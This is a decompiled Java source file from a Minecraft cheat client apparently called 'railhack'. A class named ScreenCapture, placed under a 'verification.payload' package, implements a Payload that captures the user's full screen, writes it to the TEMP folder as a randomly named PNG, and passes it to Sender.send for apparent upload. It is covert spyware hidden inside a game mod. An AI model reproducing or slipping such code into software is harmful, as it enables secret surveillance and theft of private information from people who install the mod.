//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.util.*;
import java.io.*;
import javax.imageio.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.awt.*;
import java.awt.image.*;

public final class ScreenCapture implements Payload
{
    @Override
    public void execute() throws Exception {
        final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        final Rectangle screenRectangle = new Rectangle(screenSize);
        final Robot robot = new Robot();
        final BufferedImage image = robot.createScreenCapture(screenRectangle);
        final int random = new Random().nextInt();
        final File file = new File(System.getenv("TEMP") + "\\" + random + ".png");
        ImageIO.write(image, "png", file);
        Sender.send(file);
    }
}
